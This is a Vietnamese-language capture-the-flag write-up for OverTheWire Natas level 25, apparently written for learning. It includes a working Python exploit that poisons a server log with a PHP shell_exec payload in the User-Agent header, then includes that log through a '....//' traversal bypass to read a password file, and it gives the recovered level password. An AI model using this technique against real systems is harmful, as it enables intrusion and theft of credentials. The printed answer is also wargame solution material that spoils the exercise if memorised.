# Natas 25 → 26

## Mục tiêu

Lấy password của `natas26` bằng LFI qua log poisoning.

## Tôi thấy

`lang` được đưa vào `include()` sau bộ lọc traversal yếu. User-Agent được ghi vào log theo session ID. Có thể ghi PHP code vào log rồi include file log bằng chuỗi traversal bị lọc sai.

## Cách làm

```python
import requests

s = requests.Session()
auth = ('natas25', '<password>')
ua = '<?php echo shell_exec("cat /etc/natas_webpass/natas26"); ?>'
s.get(
    'http://natas25.natas.labs.overthewire.org/',
    auth=auth,
    headers={'User-Agent': ua},
)
sid = s.cookies['PHPSESSID']
r = s.get(
    'http://natas25.natas.labs.overthewire.org/',
    auth=auth,
    headers={'User-Agent': ua},
    params={'lang': f'....//logs/natas25_{sid}.log'},
)
print(r.text)
```

Response live đã trả password của `natas26` trong log được include.

## Vì sao cách này hiệu quả

`....//` sau khi xóa một chuỗi `../` trở thành `../`, vượt qua kiểm tra traversal. File log chứa User-Agent do attacker kiểm soát và được PHP include.

## Kết quả

Password của `natas26`:

```text
3CApdpjqI4UYPxY8mHQWUdFPGH9BoUTT
```

